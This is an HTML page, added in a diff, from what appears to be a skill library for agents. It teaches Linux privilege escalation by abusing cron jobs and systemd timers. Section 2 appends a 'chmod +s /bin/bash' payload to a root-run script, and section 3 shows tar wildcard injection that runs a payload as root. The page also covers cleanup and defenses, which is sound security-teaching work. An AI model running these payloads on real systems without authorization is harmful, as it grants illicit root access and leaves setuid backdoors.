@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: cron-abuse</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>cron-abuse</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you have a Linux shell on an authorized engagement</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-linux.html">privesc-linux</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-linux.html">privesc-linux</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="linux-hardening.html">linux-hardening</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Cron jobs run as their owner on a schedule, so a root cron job that executes a file you can write is a delayed root shell. This skill covers cron enumeration and abuse on authorized engagements: finding every scheduled task, spotting writable scripts and PATH weaknesses, wildcard injection, and the systemd timer equivalent. Cron paths are quiet and reliable, which makes them a favorite; check them before kernel exploits.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>List every cron source: system crontab, cron directories, user</li>
+<p>crontabs, and systemd timers.</p>
+<li>For each job running as root, trace the full execution chain.</li>
+<li>Flag writable scripts, writable directories in the chain, and PATH</li>
+<p>weaknesses.</p>
+<li>Check wildcard usage in cron commands for injection.</li>
+<li>Exploit the weakest chain with a payload that proves privilege.</li>
+<li>Clean up the payload after confirmation.</li>
+</ol>
+<h2>1. Enumeration</h2>
+<pre><code class="language-bash"># System crontab and drop-in directories
+cat /etc/crontab 2&gt;/dev/null
+ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2&gt;/dev/null
+
+# User crontabs (root&#x27;s needs root, but check yours and others&#x27;)
+crontab -l 2&gt;/dev/null
+ls -la /var/spool/cron/crontabs/ 2&gt;/dev/null
+
+# Systemd timers: the modern cron
+systemctl list-timers --all 2&gt;/dev/null | head -20
+ls -la /etc/systemd/system/*.timer 2&gt;/dev/null
+
+# For each job, list the script and its permissions
+ls -la /opt/cleanup.sh 2&gt;/dev/null</code></pre>
+<p>Read the actual script content, not just the cron line. The cron line says what runs; the script says what it does, which commands it calls, and what you can influence.</p>
+<h2>2. Writable chain exploitation</h2>
+<pre><code class="language-bash"># Writable script run by root: append a proof payload
+ls -la /usr/local/bin/backup.sh
+# -rwxrwxr-x ... owned by root but group-writable by your group
+echo &#x27;chmod +s /bin/bash 2&gt;/dev/null; id &gt; /tmp/cronproof.txt&#x27; &gt;&gt; /usr/local/bin/backup.sh
+# Wait for the schedule, then check
+cat /tmp/cronproof.txt 2&gt;/dev/null
+
+# Safer proof that avoids persistent changes: copy a shell
+# (choose the payload the engagement approves)
+
+# PATH hijack: cron script calls &#x27;tar&#x27; without a path and cron&#x27;s PATH
+# is controllable or the directory is writable
+grep -E &#x27;^[A-Z_]+=.*PATH&#x27; /etc/crontab
+head -20 /usr/local/bin/backup.sh | grep -E &#x27;^[a-z]+ &#x27;</code></pre>
+<p>Always prefer the least invasive proof the engagement allows. A file write proving root execution is enough; leave the system as you found it by restoring the script afterward.</p>
+<h2>3. Wildcard injection</h2>
+<pre><code class="language-bash"># Classic: root cron runs &#x27;tar cf /backup.tar /var/data/*&#x27;
+# Create files whose names are tar options:
+cd /var/data
+touch -- &#x27;--checkpoint=1&#x27;
+touch -- &#x27;--checkpoint-action=exec=sh /tmp/payload.sh&#x27;
+# At the next run, tar executes your payload as root
+
+# Check for the pattern in cron scripts
+grep -rn &#x27;\*&#x27; /etc/cron.d/ /usr/local/bin/*.sh 2&gt;/dev/null | grep -E &#x27;tar|rsync|zip&#x27; | head -10</code></pre>
+<p>Wildcard injection works because the shell expands <code>*</code> before tar sees it, turning filenames into options. The fix is <code>--</code> or absolute paths in the cron command, but plenty of scripts still get this wrong.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The cron schedule is unclear. Check timestamps: <code>ls -la</code> on outputs,</li>
+<p>or watch with a marker file to learn the interval before planting a payload.</p>
+<li>The script is writable but runs as a non-root user. Still useful:</li>
+<p>lateral movement to that user may unlock their own cron or files.</p>
+<li>Systemd timers replace cron. Read the <code>.service</code> file the timer</li>
+<p>triggers; the same writable-chain analysis applies.</p>
+<li>Your payload never fires. Verify the job actually runs (system logs,</li>
+<p>timer status) before assuming the technique failed.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No cron path exists: move to kernel-exploits as the last resort, or</li>
+<p>report the privesc as not achieved with the enumeration evidence.</p>
+<li>The writable script is huge and complex: trace only the commands that</li>
+<p>run as root; a single writable sourced file anywhere in the chain is enough.</p>
+<li>Cleanup matters: remove payloads, restore modified scripts from your</li>
+<p>backup copies, and verify restoration.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see cron abuse as root processes with unexpected children, new files in cron directories (FIM alerts), and modified scripts (checksum changes). Systemd timer changes also log. Defenses are root owned, non-writable scripts and directories in every scheduled chain, absolute paths and <code>--</code> in cron commands, no wildcards with archivers, and file integrity monitoring on cron locations.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1053.003 (Scheduled Task/Job: Cron).</li>
+<li>MITRE ATT&amp;CK T1053.006 (Scheduled Task/Job: Systemd Timers).</li>
+<li>CWE-732 (Incorrect Permission Assignment for Critical Resource).</li>
+<li>CWE-426 (Untrusted Search Path).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
